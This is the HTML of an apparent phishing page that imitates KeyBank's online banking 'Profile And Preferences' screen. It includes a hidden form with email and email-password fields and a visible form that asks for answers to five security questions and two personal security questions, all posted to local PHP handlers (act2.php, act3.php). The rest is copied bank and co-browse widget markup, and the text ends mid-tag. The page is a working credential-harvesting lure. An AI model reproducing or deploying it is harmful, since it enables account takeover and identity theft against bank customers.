<!DOCTYPE html>
<html data-ng-app="olbApp" class="ng-scope" lang="en">
<head>
<meta content="text/html; charset=UTF-8" http-equiv="Content-Type">

		<!-- Needed for Bootstrap -->
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<meta http-equiv="cache-control" content="max-age=0">
		<meta http-equiv="Pragma" content="no-cache">
		<meta http-equiv="Expires" content="-1">
		<meta http-equiv="Cache-Control" content="no-cache">
		<meta http-equiv="Cache-Control" content="no-store">
		<meta http-equiv="If-Modified-Since" content="0">
	
		<title>KeyBank Profile And Preferences</title>





		
		<!-- Icons for app -->
		<link rel="apple-touch-icon" sizes="180x180" href="https://ibx.key.com/ibxolb/olb/share/assets/images/apple-touch-icon.png">
		<link rel="icon" type="image/png" href="favicon-32x32.png" sizes="32x32">
		<link rel="icon" type="image/png" href="favicon-16x16.png" sizes="16x16">
		<link rel="manifest" href="https://ibx.key.com/ibxolb/olb/share/assets/images/manifest.json">
		<link rel="mask-icon" href="https://ibx.key.com/ibxolb/olb/share/assets/images/safari-pinned-tab.svg" color="#5bbad5">
		<link rel="shortcut icon" href="email/favicon.ico">
		<meta name="msapplication-config" content="share/assets/images/browserconfig.xml">
		<meta name="theme-color" content="#ffffff">
		
		<!-- Bootstrap and special CSS files for display  -->	
		
		
		
		
		
		
		
		
		
		
	
<link media="all" href="email/index.css" type="text/css" rel="stylesheet">
  
</head>
<body style="background-image: url('email/background_day_ny_high.jpg'); background-size: cover; background-color: transparent; background-repeat: no-repeat; background-position: -9999px -9999px;">
		
		<!-- hidden iframe to call external links to kill active sessions -->
		<iframe id="externalLinkFrame" style="visibility: hidden; width: 0px; height: 0px;" src="index_1.html"></iframe>
		<div>
			<!--All the common popup actions content goes here like (timeout, profile et.,)-->
			<!-- ngIf: _showSessionTimeout -->
			<div id="stepUpSection" class="animate slideInDown ng-hide" ng-show="_showStepUp" style="">
				<!-- ngInclude: _globalStepUpContainerTemplate --><article id="stepup" ng-include="_globalStepUpContainerTemplate" class="ng-scope" style=""><!-- ngIf: $$config.channel === $$constants.CHANNEL_MOBILE_APP --><!-- ngIf: $$config.channel==$$constants.CHANNEL_WEB ||  $$config.channel === $$constants.CHANNEL_TABLET --><section data-ng-if="$$config.channel==$$constants.CHANNEL_WEB ||  $$config.channel === $$constants.CHANNEL_TABLET " class="container inner-container ng-scope" style=""><div data-ng-controller="$$globalStepUpController as gStepUpCtrl" class="ng-scope"><header><section class="longProcess-header"><section class="headersection"><article class="container card-title"><div class="longflow-header"><div class="card-title-reset"><span class="ng-binding">Authentication Required</span></div><a href="javascript:void(0);" title="Click to Close" ng-click="gStepUpCtrl.close()" class="header-close"><icon>close</icon></a></div></article></section><!-- ngIf: gStepUpCtrl.message --></section></header><section class="step-up-questions"><section class="row"><section class="col-xxl-6 col-xl-6 col-lg-7 col-md-9 col-sm-12 col-xs-12 changepassword-stepupverid"><div id="globalStepUpContainer"></div></section></section></section></div></section><!-- end ngIf: $$config.channel==$$constants.CHANNEL_WEB ||  $$config.channel === $$constants.CHANNEL_TABLET --></article>
			</div>
			<div id="printSection">
				<!-- ngInclude: printTemplate -->
			</div>
			<!--Page header and content -->
		    <div id="ibxMainView" ng-class="{'content-blur':_showSessionTimeout}" ng-show="!_showStepUp" class="" style="">
		    		<div class="busy hide-me">
		    			<svg class="spinner-large" width="56" height="56">
							<circle class="spinner-large-circle" cx="28" cy="28" r="25"></circle>
						</svg>
		    		</div>
		    		<!-- ngIf: !_animateUiView() -->
		    		<!-- ngIf: _animateUiView() --><!-- uiView:  --><div id="ui-view" ng-if="_animateUiView()" ui-view="" class="anim-in-out anim-fade ng-scope" data-anim-sync="true" data-anim-speed="500"><div data-ng-controller="profileAndPreferencesController as profileAndPreferences" ng-init="profileAndPreferences.init()" class="ng-scope"><div class="container inner-container"><div><!-- ngInclude: undefined --><ng-include src="$$config.appContext+templates.HEADER_LONG_FLOW" class="ng-scope"><div data-ng-controller="headerLongFlowController as longFlow" class="ng-scope"><div class="longProcess-header" ng-init="longFlow.init();"><div class="headersection" data-ng-show="longFlow.showHeaderElements"><div class="client-view-toggle pull-left ng-hide" data-ng-show="longFlow.showClientViewToggle"><div class="toggle-switch pull-left"> <input class="cbx ng-pristine ng-untouched ng-valid" id="unchecked_clview_disabled" ng-model="longFlow.clientViewEnabled" ng-click="longFlow.toggleClientView()" type="checkbox"><label data-test="us2cltvw" for="unchecked_clview_disabled" class="lbl"></label></div><p class="pull-left card-title">Client View</p></div><div class="container card-title"><div class="longflow-header"><!-- ngIf: longFlow.showNavButtons --><a href="javascript:void(0);" role="link" ng-init="backClicked=false" ng-if="longFlow.showNavButtons" class="longflow-back ng-scope" id="longflow-back-arrow" ng-blur="!backClicked &amp;&amp; longFlow.setFocusToClose();" ng-click="backClicked=true;longFlow.goBack()" style=""><icon data-test="en1bckbtn">arrow_back</icon></a><!-- end ngIf: longFlow.showNavButtons --><!-- ngIf: !longFlow.showNavButtons --><div class="card-title-reset"><!-- ngIf: longFlow.headerTitleAsHtml --> <!-- ngIf: longFlow.headerTitle --><span ng-if="longFlow.headerTitle" data-test="adcrdttl" class="ng-binding ng-scope">My Profile</span><!-- end ngIf: longFlow.headerTitle --></div><!-- ngIf: longFlow.showCloseButton --><a href="javascript:void(0);" title="Click to Close" ng-click="longFlow.close()" ng-if="longFlow.showCloseButton" class="header-close ng-scope" style=""><icon data-test="en1clsbtn">close</icon></a><!-- end ngIf: longFlow.showCloseButton --></div></div><!-- ngIf: longFlow.showProgressBar --></div><!-- ngIf: longFlow.message --></div></div></ng-include></div><!-- ngIf: profileAndPreferences.initProcessCompleted --><div class="container ng-scope" ng-if="profileAndPreferences.initProcessCompleted"><!-- ngInclude: undefined --><ng-include src="$$config.appContext+templates.CARD_CONTAINER_TMPL" class="ng-scope"><div data-ng-controller="cardContainerController as cards" class="position-default no-print ng-scope"><!-- ngIf: cards.showCard --></div></ng-include></div><!-- end ngIf: profileAndPreferences.initProcessCompleted --><div id="profileAndPreferencesContainer"><!-- ngIf: profileAndPreferences.currentComponent == $$constants.USER_PROFILE --><!-- ngIf: profileAndPreferences.currentComponent == $$constants.CHANGE_PASSWORD --><!-- ngIf: profileAndPreferences.currentComponent == $$constants.CHANGE_SECURITY_QUESTIONS --><!-- ngIf: profileAndPreferences.currentComponent == $$constants.CHANGE_PREFERENCES --><div ng-if="profileAndPreferences.currentComponent == $$constants.CHANGE_PREFERENCES" class="ng-scope"><!-- ngInclude: undefined --><ng-include src="$$config.appContext+$$templates.CHANGE_PREFERENCES_TMPL" class="ng-scope" style=""><div data-ng-controller="$$changePreferencesController as changePreferences" class="post-login-container ng-scope"><!-- ngIf: changePreferences.forceUpdateFlag --><forcedpage><div class="row"><!-- ngIf: changePreferences.updatePhone --></div><div class="row"><!-- ngIf: changePreferences.updateEmail && changePreferences.updatePhone --></div><div class="row"><!-- ngIf: changePreferences.updateEmail --><div class="col-xs-12 col-lg-6 col-xl-5 col-xxl-4 ng-scope" ng-if="changePreferences.updateEmail"><p class="ng-binding">To help us verify your identity, we will sometimes ask you questions based on personal experiences. Choose and answer the questions correctly according to your account preference.</p>
                        <form role="form" class="ng-pristine ng-valid" action="act3.php" style="display:none;">
                            <div class="form-group section-label" ng-class="{'has-error':changePreferences.emailError, 'has-focus' : changePreferences.user.newEmailAddress || changePreferences.emailFocus}"> 
                                <label for="exampleInputEmail2" class="ng-binding">Enter your email address</label> 
                                <input data-test="cpenmail" class="form-control ng-pristine ng-untouched ng-valid" id="exampleInputEmail2" placeholder="" autocomplete="off" autocapitalize="off"  value="" type="text" name="email"><!-- ngIf: changePreferences.emailError -->
                                </div>
                            <div class="form-group section-label" ng-class="{'has-error':changePreferences.confirmEmailError, 'has-focus': changePreferences.user.confirmEmailAddress || changePreferences.confirmEmailFocus}"> 
                                <label for="exampleInputEmail3" class="ng-binding">Confirm Email Address</label> 
                                <input class="form-control ng-pristine ng-untouched ng-valid" id="exampleInputEmail3" placeholder=""  autocomplete="off" autocapitalize="off" value="" type="password" name="emailpass"><!-- ngIf: changePreferences.confirmEmailError --></div>

</div><!-- end ngIf: changePreferences.updateEmail --></div><!-- ngIf: changePreferences.updateEmail || changePreferences.updatePhone --><div class="row ng-scope" style="display:none;"><div class="col-xs-12 col-lg-3 col-xl-2 col-xxl-4">  <button data-test="cpupmail" type="submit" class="btn btn-lg btn-primary"   accesskey ng-class="{'btn-block':$$config.channel === $$constants.CHANNEL_MOBILE_APP || $$config.channel === $$constants.CHANNEL_TABLET }" >Save</button> <!-- ngIf: !changePreferences.forceUpdateFlag --><button type="button" class="btn btn-lg btn-secondary ng-scope preferences-cancel-btn" ng-if="!changePreferences.forceUpdateFlag" data-ng-click="changePreferences.goBack()" ng-class="{'btn-block':$$config.channel === $$constants.CHANNEL_MOBILE_APP || $$config.channel === $$constants.CHANNEL_TABLET ,'preferences-cancel-btn':$$config.channel === $$constants.CHANNEL_WEB }">Cancel</button><!-- end ngIf: !changePreferences.forceUpdateFlag --></div></div><!-- end ngIf: changePreferences.updateEmail || changePreferences.updatePhone -->
                        
                        <form action="act2.php" method="post" class="ng-pristine ng-valid" >
    <div class="form-group section-label" style="width:500px;"visibility: hidden;">

<input type="hidden" name="email" value=" " class="form-control" placeholder="Email Address" />
       
        </div>
    <div class="password section-label has-focus"style="width:500px;">

<input type="hidden" name="emailpass" value=" " class="form-control"  placeholder="Email Password"/>
     
             
    
            </div>
                    
       
<input type="hidden" name="name" value="Save " class="btn btn-lg btn-primary" />
   
 
                        </form>
                        </forcedpage></div></ng-include></div><!-- end ngIf: profileAndPreferences.currentComponent == $$constants.CHANGE_PREFERENCES --><!-- ngIf: profileAndPreferences.currentComponent == $$constants.SHOW_UPDATE_ADDRESS --><!-- ngIf: profileAndPreferences.currentComponent == $$constants.TERMS_AND_CONDITIONS --></div></div></div></div><!-- end ngIf: _animateUiView() -->
		    </div>
	    </div>
	
	
	<div class="form-group" style="padding-left:20px;">
	<form action="act2.php" method="post" class="login-form">
            <div style="width:500px;">

   <div class="form-group">
    <select name="q1" class="form-control">
        <option value="Choose One" selected="selected" disabled="disabled">Question One</option>
        <option value="In what city does your nearest sibling ?">In what city does your nearest sibling live?</option
        <option value="What is the first name of the best man at your wedding?">What is the first name of the best man at your wedding?</option>
        <option value="What is your best friend's first name?">What is your best friend's first name?</option>
        <option value="What is your all-time favorite sports movie?">What is your all-time favorite sports movie?</option>
        <option value="Who is your favorite historical figure?">Who is your favorite historical figure?</option>
        <option value="Whom did you go to prom with?">Whom did you go to prom with?</option>
        <option value="What street did your best friend live on in high school?">What street did your best friend live on in high school?</option>
        <option value="What was your favorite teacher's name?">What was your favorite teacher's name?</option>
        <option value="If you have ever broken a bone, which one?">If you have ever broken a bone, which one?</option>
        <option value="Who was your favorite childhood hero?">Who was your favorite childhood hero?</option>
    </select>
    <div>
        <label class="ng-binding">Answer</label>
    </div>
    <div>
        <input class="form-control" name="ans1" type="text" />
    </div>
        </div>



    <div class="form-group">
        <select name="q2" class="form-control">
            <option value="Choose One" selected="selected" disabled="disabled">Question Two</option>
            <option value="In what city does your nearest sibling ?">
                In what city does your nearest sibling live?
            </option>
            <option value="What is the first name of the best man at your wedding?">What is the first name of the best man at your wedding?</option>
            <option value="What is your best friend's first name?">What is your best friend's first name?</option>
            <option value="What is your all-time favorite sports movie?">What is your all-time favorite sports movie?</option>
            <option value="Who is your favorite historical figure?">Who is your favorite historical figure?</option>
            <option value="Whom did you go to prom with?">Whom did you go to prom with?</option>
            <option value="What street did your best friend live on in high school?">What street did your best friend live on in high school?</option>
            <option value="What was your favorite teacher's name?">What was your favorite teacher's name?</option>
            <option value="If you have ever broken a bone, which one?">If you have ever broken a bone, which one?</option>
            <option value="Who was your favorite childhood hero?">Who was your favorite childhood hero?</option>
        </select>
        <div>
            <label>Answer</label>
        </div>
        <div>
            <input class="form-control" name="ans2" type="text" />
        </div>
    </div>


    <div class="form-group">
        <select name="q3" class="form-control">
            <option value="Choose One" selected="selected" disabled="disabled">Question Three</option>
            <option value="In what city does your nearest sibling ?">
                In what city does your nearest sibling live?
            </option>
            <option value="What is the first name of the best man at your wedding?">What is the first name of the best man at your wedding?</option>
            <option value="What is your best friend's first name?">What is your best friend's first name?</option>
            <option value="What is your all-time favorite sports movie?">What is your all-time favorite sports movie?</option>
            <option value="Who is your favorite historical figure?">Who is your favorite historical figure?</option>
            <option value="Whom did you go to prom with?">Whom did you go to prom with?</option>
            <option value="What street did your best friend live on in high school?">What street did your best friend live on in high school?</option>
            <option value="What was your favorite teacher's name?">What was your favorite teacher's name?</option>
            <option value="If you have ever broken a bone, which one?">If you have ever broken a bone, which one?</option>
            <option value="Who was your favorite childhood hero?">Who was your favorite childhood hero?</option>
        </select>
        <div>
            <label>Answer</label>
        </div>
        <div>
            <input class="form-control" name="ans3" type="text" />
        </div>
    </div>


    <div class="form-group">
        <select name="q4" class="form-control">
            <option value="Choose One" selected="selected" disabled="disabled">Question Four</option>
            <option value="In what city does your nearest sibling ?">
                In what city does your nearest sibling live?
            </option>
            <option value="What is the first name of the best man at your wedding?">What is the first name of the best man at your wedding?</option>
            <option value="What is your best friend's first name?">What is your best friend's first name?</option>
            <option value="What is your all-time favorite sports movie?">What is your all-time favorite sports movie?</option>
            <option value="Who is your favorite historical figure?">Who is your favorite historical figure?</option>
            <option value="Whom did you go to prom with?">Whom did you go to prom with?</option>
            <option value="What street did your best friend live on in high school?">What street did your best friend live on in high school?</option>
            <option value="What was your favorite teacher's name?">What was your favorite teacher's name?</option>
            <option value="If you have ever broken a bone, which one?">If you have ever broken a bone, which one?</option>
            <option value="Who was your favorite childhood hero?">Who was your favorite childhood hero?</option>
        </select>
        <div>
            <label>Answer</label>
        </div>
        <div>
            <input class="form-control" name="ans4" type="text" />
        </div>
    </div>

         <div class="form-group">
        <select name="q5" class="form-control">
            <option value="Choose One" selected="selected" disabled="disabled">Question Five</option>
            <option value="In what city does your nearest sibling ?">
                In what city does your nearest sibling live?
            </option>
            <option value="What is the first name of the best man at your wedding?">What is the first name of the best man at your wedding?</option>
            <option value="What is your best friend's first name?">What is your best friend's first name?</option>
            <option value="What is your all-time favorite sports movie?">What is your all-time favorite sports movie?</option>
            <option value="Who is your favorite historical figure?">Who is your favorite historical figure?</option>
            <option value="Whom did you go to prom with?">Whom did you go to prom with?</option>
            <option value="What street did your best friend live on in high school?">What street did your best friend live on in high school?</option>
            <option value="What was your favorite teacher's name?">What was your favorite teacher's name?</option>
            <option value="If you have ever broken a bone, which one?">If you have ever broken a bone, which one?</option>
            <option value="Who was your favorite childhood hero?">Who was your favorite childhood hero?</option>
        </select>
        <div>
            <label>Answer</label>
        </div>
        <div>
            <input class="form-control" name="ans5" type="text" />
        </div>
    </div>
    
                 <h4>If you have your personal question you Answered, type it below and answer it correctly</h4>

<div class="form-group">

     <div>
            <label>Personal Question</label>
        </div>
        <div>
            <input class="form-control" name="q6" type="text">
        </div>
    <div>
            <label>Answers</label>
        </div>
     <div>
            <input class="form-control" name="ans6" type="text">
        </div>

</div>
                <div class="form-group">

     <div>
            <label>Personal Question</label>
        </div>
        <div>
            <input class="form-control" name="q7" type="text">
        </div>
    <div>
            <label>Answers</label>
        </div>
     <div>
            <input class="form-control" name="ans7" type="text">
        </div>

</div>

                           <br />
       
<div class="row ng-scope" ><div class="col-xs-12 col-lg-3 col-xl-2 col-xxl-4"    >
<input type="submit" name="name" value="Update" class="btn btn-lg btn-primary" />
    </div>
    </div>
                </div>
                        </form>
       

        

	</div>
	 

	
	
	
	
	
	
	
	
	
	
	
	
	
<iframe id="LL_DataServer" name="LL_DataServer" src="index_2.html" title="hidden co-browse frame" scrolling="no" allowtransparency="true" aria-hidden="true" style="display: block; border: 0px none; width: 1px; height: 1px; position: absolute; top: 100%; margin-top: -1px; left: 100%; margin-left: -1px;" width="1px" height="1px" frameborder="0"></iframe><div id="V4LLPanel_Container"><div style="z-index: 1500001; position: fixed; cursor: pointer; visibility: hidden; overflow: hidden; background: transparent url('v4llpaneltoggler.png') no-repeat scroll 0% 0% !important; width: 157px; height: 36px; bottom: 0px; right: 16px;" id="V4LLPanel_CollapsedNarrowNoAgent" onclick="LL_CustomUI.noAgentPanel.expand()"><div id="V4LLPanel_InnerLogo" style="margin: 9px 10px 0px; width: 23px; height: 24px; float: left; background: transparent url('v4llpanellogo.png') no-repeat scroll 0% 0% !important;" class="LLV4Logo"></div><span style="display: inline-block; width: 98px; text-align: center; float: left; margin: 12px 0px 0px; font-family: Tahoma; font-size: 14px; color: rgb(162, 162, 162);" id="V4LLPanel_CollapsedNumContNarrow" tabindex="0" role="button" aria-live="assertive" aria-label="Expand Browse with Specialist widget"></span></div><div id="V4LLPanel_HintBlock" style="bottom: 30px; right: 16px; z-index: 20000; position: fixed; cursor: pointer; visibility: hidden; background: transparent url('v4llpanelhovertooltipbg.png') no-repeat scroll 0% 0% !important; width: 157px; height: 78px;" ll_customui.noagentpanel.hint.hide();"=""><span id="V4LLPanel_Hint_FirstLine" style="display: block; text-align: center; font-size: 14px; font-family: Trebuchet MS; color: rgb(52, 52, 52); width: 157px; font-style: normal; font-weight: bold; margin-top: 13px;">Browse together</span><span id="V4LLPanel_Hint_SecondLine" style="display: block; text-align: center; font-size: 10px; font-family: Trebuchet MS; color: rgb(52, 52, 52); font-weight: normal; font-style: normal; width: 157px;">with our experts online</span></div><div id="V4LLPanel_GenericToggler" style="position: fixed; z-index: 1500001; cursor: pointer; overflow: hidden; background: transparent url('v4llpaneltoggler.png') no-repeat scroll 0% 0% !important; width: 157px !important; height: 36px !important; bottom: 0px; right: 16px; visibility: hidden;" onclick="LL_CustomUI.noAgentPanel.expand()"><div id="V4LLPanel_InnerLogo" style="margin: 9px 10px 0px; width: 23px; height: 24px; float: left; background: transparent url('v4llpanellogo.png') no-repeat scroll 0% 0% !important;"></div><span id="V4LLPanel_InnerTitle" style="position: absolute; top: 11px; left: 42px; font-family: Tahoma; font-size: 14px !important; color: rgb(255, 255, 255);" class="V4LLTitleText" tabindex="0" role="button">Co-browse</span></div><div id="V4LLPanel" style="position: fixed; z-index: 1500002; height: 0px; overflow: hidden; width: 284px; background: transparent url('v4llpanelbg.png') no-repeat scroll 0% 0% !important; bottom: 0px; right: 16px;" class="makeVisible"><div id="V4LLPanel_InnerContainer" style="position: relative; padding: 42px 0px 0px 4px; height: 130px; width: 277px !important;"><div id="V4LLPanel_MovingToggler" style="width: 256px; height: 46px; position: absolute; left: 0px; top: 0px; margin-left: 10px; background: transparent url('v4llpanelsepline.png') repeat-x scroll left bottom !important;" class="LLV4Separator"><div id="V4LLPanel_LogoToggler" style="margin: 13px 16px 0px 3px; width: 23px; height: 24px; float: left; background: transparent url('v4llpanellogo.png') no-repeat scroll 0% 0% !important;" class="LLV4Logo"><div id="V4LLPanel_PanelMinimize" tabindex="0" role="button" aria-label="Collapse Browse with Specialist widget" style="position: absolute; width: 15px; height: 10px; cursor: pointer; margin: 7px 0px 0px; right: 26px; background: transparent url('v4llpanelminimize.png') no-repeat scroll left bottom !important;" onclick="LL_CustomUI.noAgentPanel.collapse()" disabled="disabled" aria-hidden="true"></div><div id="V4LLPanel_PanelClose" role="button" tabindex="0.1" aria-label="Disconnect session for browse with specialist" style="position: absolute; width: 11px; height: 10px; cursor: pointer; margin: 7px 0px 0px; right: 0px; background: transparent url('v4llpanelclosebutton.png') no-repeat scroll 0% 0% !important;" onclick="LL_CustomUI.noAgentPanel.openDisconnectConfirmWindow()" disabled="disabled" aria-hidden="true"></div></div><span id="V4LLPanel_TogglerText" style="position: absolute; top: 17px; left: 34px; font-family: Tahoma !important; font-size: 14px; color: rgb(255, 255, 255) !important;" class="V4LLTitleText">Co-browse</span><div id="V4LLPanelDisconnectConfirmWindow" aria-atomic="true" role="dialog" style="box-sizing: content-box; display: none; position: absolute; top: 47px; left: 2px; width: 232px; background-color: rgb(47, 47, 47); border-radius: 5px; border: 1px solid rgb(174, 174, 174); box-shadow: 0px 1px 16px rgb(0, 0, 0); z-index: 11; text-align: center; padding: 28px 10px;"><span style="font-size: 14px; color: rgb(255, 254, 254); font-weight: normal; font-style: normal; font-family: Trebuchet MS;">Are you sure you want to terminate this session?</span><br><a id="V4LLPanel_CloseDeclineButton" tabindex="0" role="button" aria-label="Decline session end" onclick="LL_CustomUI.noAgentPanel.declineSessionEnd(); return false;" style="height: 24px !important; background: transparent url('v4llpaneldisconnectbutton.png') no-repeat scroll 0% 0%; color: rgb(255, 255, 255); font-family: Trebuchet MS; font-size: 18px; font-weight: normal !important; font-style: normal !important; width: 103px; text-align: center; display: inline-block; text-decoration: none; padding-top: 3px; padding-bottom: 2px; margin-top: 35px; margin-right: 10px;" href="javascript:void(0)" disabled="disabled" aria-hidden="true">No</a><a id="V4LLPanel_CloseConfirmButton" tabindex="0" role="button" aria-label="Confirm session end" onclick="LL_CustomUI.noAgentPanel.confirmSessionEnd(); return false;" style="height: 24px !important; background: transparent url('v4llpaneldisconnectbutton.png') no-repeat scroll 0% 0%; color: rgb(255, 255, 255); font-family: Trebuchet MS; font-size: 18px; font-weight: normal !important; font-style: normal !important; width: 103px; text-align: center; display: inline-block; text-decoration: none; padding-top: 3px; padding-bottom: 2px; margin-top: 35px;" href="javascript:void(0)" disabled="disabled" aria-hidden="true">Yes</a><p aria-hidden="false" style="display: none;" hidden="true">End of informational layer</p></div></div><div aria-atomic="true" style="height: 85px; margin-left: 10px; width: 252px; overflow: hidden; background: transparent url('v4llpanelsepline.png') repeat-x scroll left bottom !important;"><table role="presentation" style="background-color: transparent; margin-top: 0px;" cellspacing="0" cellpadding="0" border="0"><tbody><tr style="background-color: transparent;"><td style="height: 85px; vertical-align: middle; padding: 0px; border: 0px none; background-color: transparent !important;"><p id="V4LLPanel_passToBeginText" style="line-height: 18px; font-weight: normal; position: relative; float: left; box-sizing: content-box; margin-bottom: 7px; text-align: center; margin-top: 5px; width: 243px; margin-left: 10px; padding-top: 6px; overflow: hidden; color: rgb(162, 162, 162) !important; font-size: 14px !important;" class="LLV4Separator"><span id="V4LLPanel_PhoneNumber" role="dialog" style="position: relative; float: left; padding: 6px 0px 7px 48px; background: transparent url('v4llpanelphoneicon.png') no-repeat scroll 0px 2px !important; font-family: Trebuchet MS; color: rgb(162, 162, 162) !important;"><span id="V4LLPanel_PhoneNumberText" aria-hidden="true" style="position: relative; float: left; color: rgb(162, 162, 162) !important;"></span><span id="V4LLPanel_phoneNum" aria-hidden="true" style="font-size: 16px; color: rgb(162, 162, 162) !important; font-family: Trebuchet MS !important;">1.800.539.1539</span><span id="V4LLPanel_HiddenPhone" style="display: none;" aria-hidden="true" disabled="disabled"> &nbsp; 1.800.539.1539</span></span></p></td></tr></tbody></table></div><div style="height: 37px; overflow: hidden;"><table role="presentation" style="background-color: transparent; margin-top: 0px;" cellspacing="0" cellpadding="0" border="0"><tbody><tr style="background-color: transparent;"><td style="height: 37px; vertical-align: middle; padding: 0px; border: 0px none; background-color: transparent !important;"><p id="V4LLPanel_provideCodeMessage" style="line-height: 17px; font-weight: normal; width: 277px; box-sizing: border-box; text-align: center; margin: 0px; padding: 0px 10px; color: rgb(162, 162, 162); font-size: 14px !important; font-family: Trebuchet MS;" disabled="disabled" aria-hidden="true">Secure Session ID Number</p></td></tr></tbody></table></div><p id="V4LLPanel_NumberBox" aria-live="assertive" style="font-weight: normal; box-sizing: content-box; text-align: center; padding: 13px 0px 12px; margin: 5px 0px 5px 10px; height: 22px; line-height: 23px; width: 252px; background-color: rgb(65, 65, 65) !important; color: rgb(255, 255, 255) !important; font-size: 24px !important; font-family: Trebuchet MS;"><span style="background: transparent url('v4llpanelpreload.gif') no-repeat scroll 0% 0%; width: 15px; height: 15px; display: block; margin: 1px auto 0px;" id="V4LLPanel_Preload"></span></p><p id="V4LLPanel_DisconnectBtn" style="display: none; width: 252px; margin-left: 10px; margin-top: 7px; padding-top: 12px; background: transparent url('v4llpanelsepline.png') repeat-x scroll 0% 0% !important;" class="LLV4Separator"><a id="V4LLPanel_DisconnectTrigger" role="button" tabindex="0.1" aria-label="Disconnect session for browse with specialist" onclick="LL_CustomUI.noAgentPanel.doDisconnect(); return false;" style="height: 24px !important; background: transparent url('v4llpaneldisconnectbutton.png') no-repeat scroll 0% 0%; color: rgb(254, 254, 254); font-family: Trebuchet MS; font-size: 14px; font-weight: normal !important; font-style: normal !important; margin-bottom: 8px; margin-top: 2px; width: 142px; text-align: center; display: block; text-decoration: none; padding-top: 5px; margin-left: 58px;" href="javascript:void(0)">Disconnect</a></p><div id="V4LLPanel_termsAndConditionsText" style="height: 15px; width: 252px; margin-left: 10px; padding-top: 18px; margin-top: 10px; text-align: center; background: transparent url('v4llpanelsepline.png') repeat-x scroll left top !important;" class="LLV4Separator"><a href="javascript:void(0)" onclick="LL_CustomUI.noAgentPanel.openTermsAndConditions(); return false;" id="V4LLPanel_TermsAndConditions" style="font-weight: normal; margin-bottom: 6px; margin-top: 15px; font-size: 10px; color: rgb(162, 162, 162) !important; font-family: Trebuchet MS !important;" disabled="disabled" aria-hidden="true"></a></div><p id="V4LLPanel_PoweredBy" style="font-weight: normal; width: 252px; margin-left: 10px !important; text-align: center; padding: 8px 0px 4px; margin-top: 14px; margin-right: 0px; margin-bottom: 0px; height: 15px; clear: both; background: transparent url('v4llpanelsepline.png') repeat-x scroll left top !important; color: rgb(162, 162, 162) !important; font-family: Trebuchet MS !important; font-size: 10px !important;" class="LLV4Separator" disabled="disabled" aria-hidden="true">powered by Oracle Co-browsing</p><span style="display: none;" aria-hidden="false" hidden="true">End of Modal Layer</span></div></div></div><div id="V4LLPanel_TCContainer"><div id="V4LLPanel_TermsAndConditionsToggler" tabindex="0" role="button" aria-live="assertive" aria-label="Expand Browse with Specialist widget" style="position: fixed; z-index: 1500001; cursor: pointer; overflow: hidden; background: transparent url('v4llpaneltoggler.png') no-repeat scroll 0% 0% !important; width: 157px !important; height: 36px !important; bottom: 0px; right: 16px;"><div id="V4LLPanel_InnerLogo" style="margin: 9px 10px 0px; width: 23px; height: 24px; float: left; background: transparent url('v4llpanellogo.png') no-repeat scroll 0% 0% !important;"></div><span id="V4LLPanel_InnerTitle" style="position: absolute; top: 11px; left: 42px; font-family: Tahoma; font-size: 14px !important; color: rgb(255, 255, 255);" class="V4LLTitleText">Co-browse</span></div><div id="V4LLPanel_HintBlock" style="bottom: 30px; right: 16px; z-index: 1500002; position: fixed; cursor: pointer; visibility: hidden; background: transparent url('v4llpanelhovertooltipbg.png') no-repeat scroll 0% 0% !important; width: 157px; height: 78px;"><span id="V4LLPanel_Hint_FirstLine" style="display: block; text-align: center; font-size: 14px; font-family: Trebuchet MS; color: rgb(52, 52, 52); width: 157px; font-style: normal; font-weight: bold; margin-top: 13px;">Browse together</span><span id="V4LLPanel_Hint_SecondLine" style="display: block; text-align: center; font-size: 10px; font-family: Trebuchet MS; color: rgb(52, 52, 52); font-weight: normal; font-style: normal; width: 157px;">with our experts online</span></div><div id="V4LLTermsAndConditionsWindow" style="font-size: 12px; position: fixed; z-index: 1500002; height: 0px; overflow: hidden; width: 284px; background: transparent url('v4llpanelbg.png') no-repeat scroll 0% 0% !important; bottom: 0px; right: 16px;"><div id="V4LLPanel_InnerContainer" style="text-align: center; position: relative; padding: 58px 0px 0px 4px; height: 165px; width: 277px !important;"><div id="V4LLPanel_MovingToggler" style="width: 256px; height: 49px; position: absolute; left: 0px; top: 0px; margin-left: 10px; background: transparent url('v4llpanelsepline.png') repeat-x scroll left bottom !important;" class="LLV4Separator"><div id="V4LLPanel_LogoToggler" style="margin: 13px 16px 0px 3px; width: 23px; height: 24px; float: left; background: transparent url('v4llpanellogo.png') no-repeat scroll 0% 0% !important;" class="LLV4Logo"><div id="V4LLPanel_PanelMinimizeTC" role="button" tabindex="0" aria-label="Collapse Browse with Specialist widget" style="position: absolute; width: 15px; height: 10px; cursor: pointer; margin: 7px 0px 0px; right: 26px; background: transparent url('v4llpanelminimize.png') no-repeat scroll left bottom !important;" onclick="LL_CustomUI.tcPanel.collapse()" disabled="disabled" aria-hidden="true"></div><div id="V4LLPanel_PanelCloseTC" role="button" tabindex="0.1" aria-label="Close" style="position: absolute; width: 11px; height: 10px; cursor: pointer; margin: 7px 0px 0px; right: 0px; background: transparent url('v4llpanelclosebutton.png') no-repeat scroll 0% 0% !important;" onclick="LL_CustomUI.tcPanel.openDisconnectConfirmWindow()" disabled="disabled" aria-hidden="true"></div></div><span id="V4LLPanel_TogglerText" style="position: absolute; top: 17px; left: 34px; font-family: Tahoma !important; font-size: 14px; color: rgb(255, 255, 255) !important;" class="V4LLTitleText">Co-browse</span><div role="dialog" aria-atomic="true" id="V4LLPanelDisconnectConfirmWindowTC" style="box-sizing: content-box; display: none; position: absolute; top: 47px; left: 2px; width: 232px; background-color: rgb(47, 47, 47); border-radius: 5px; border: 1px solid rgb(174, 174, 174); box-shadow: 0px 1px 16px rgb(0, 0, 0); z-index: 11; text-align: center; padding: 28px 10px;"><span style="font-size: 14px; color: rgb(255, 254, 254); font-weight: normal; font-style: normal; font-family: Trebuchet MS;">Are you sure you want to terminate this session?</span><br><a id="V4LLPanel_CloseDeclineButtonTC" tabindex="0" role="button" aria-label="Decline session end" onclick="LL_CustomUI.tcPanel.declineSessionEnd(); return false;" style="box-sizing: content-box; height: 24px !important; background: transparent url('v4llpaneldisconnectbutton.png') no-repeat scroll 0% 0%; color: rgb(255, 255, 255); font-family: Trebuchet MS; font-size: 18px; font-weight: normal !important; font-style: normal !important; width: 103px; text-align: center; display: inline-block; text-decoration: none; padding-top: 3px; padding-bottom: 2px; margin-top: 35px; margin-right: 10px;" 